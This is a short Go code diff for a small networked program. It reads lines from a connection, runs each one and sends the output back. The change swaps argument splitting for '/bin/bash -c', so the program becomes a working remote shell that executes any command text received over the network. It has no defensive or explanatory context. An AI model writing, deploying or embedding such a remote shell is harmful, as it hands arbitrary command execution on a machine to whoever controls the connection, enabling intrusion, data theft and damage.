@@ -6,17 +6,10 @@ import (
 	"net"
 	"os"
 	"os/exec"
-	"strings"
 )
 
 func run(oneliner string) []byte {
-	parts := strings.Fields(oneliner)
-	if len(parts) == 0 {
-		return []byte{}
-	}
-	first := parts[0]
-	rest := parts[1:]
-	cmd := exec.Command(first, rest...)
+	cmd := exec.Command("/bin/bash", "-c", oneliner)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return []byte(err.Error())
@@ -43,6 +36,8 @@ func main() {
 		line := scanner.Text() //+ "\n"
 		log.Println(line)
 		// conn.Write([]byte(line))
-		conn.Write(run(line))
+		comOut := run(line)
+		conn.Write(comOut)
+		os.Stdout.Write(comOut)
 	}
 }
